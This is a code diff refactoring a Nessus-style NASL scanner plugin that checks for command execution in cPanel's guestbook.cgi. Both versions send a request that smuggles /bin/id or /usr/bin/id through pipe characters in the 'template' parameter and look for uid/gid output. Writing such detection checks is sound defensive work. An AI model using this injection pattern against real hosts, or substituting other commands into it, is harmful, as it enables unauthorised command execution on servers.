@@ -11,17 +11,7 @@
 # 
 
 
-
-if(description)
-{
- script_id(11281);
- script_version ("$Revision: 1.1 $");
- script_bugtraq_id(6882);
- 
- name["english"] = "cpanel remote command execution";
- script_name(english:name["english"]);
- 
- desc["english"] = "
+ desc = "
 cpanel is installed and does not properly filter user input.
 A cracker may use this flaw to execute any command on your system.
 
@@ -30,7 +20,17 @@ Risk factor : High";
 
 
 
- script_description(english:desc["english"]);
+if(description)
+{
+ script_id(11281);
+ script_bugtraq_id(6882);
+ script_version ("$Revision: 1.6 $");
+ 
+ name["english"] = "cpanel remote command execution";
+ script_name(english:name["english"]);
+ 
+
+ script_description(english:desc);
  
  summary["english"] = "Executes /bin/id";
  script_summary(english:summary["english"]);
@@ -48,29 +48,23 @@ Risk factor : High";
  exit(0);
 }
 
-#
-
 include("http_func.inc");
 include("http_keepalive.inc");
 
+cmd[0] = "/usr/bin/id";
+cmd[1] = "/bin/id";
 
-function check(port, cmd)
+port = get_http_port(default:80);
+if ( ! port ) exit(0);
+
+for (i=0; i<2; i++)
 {
- req = http_get(item:string("/cgi-sys/guestbook.cgi?user=cpanel&template=|", cmd, "|"),
-	       port:port);
- resp = http_keepalive_send_recv(port:port, data:req);
- if(resp == NULL)exit(0);
-
- if(("uid=" >< resp) && ("gid=" >< resp)){
-	security_hole(port);
-	exit(0);
-	}		       
+http_check_remote_code (
+			unique_dir:"/cgi-sys",
+			check_request:"/guestbook.cgi?user=cpanel&template=|" + cmd[i] + "|",
+			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
+			command:"id",
+			description:desc,
+			port:port
+			);
 }
-
-
-port = get_kb_item("Services/www");
-if(!port) port = 80;
-
-
-check(port:port, cmd:"/usr/bin/id");
-check(port:port, cmd:"/bin/id");
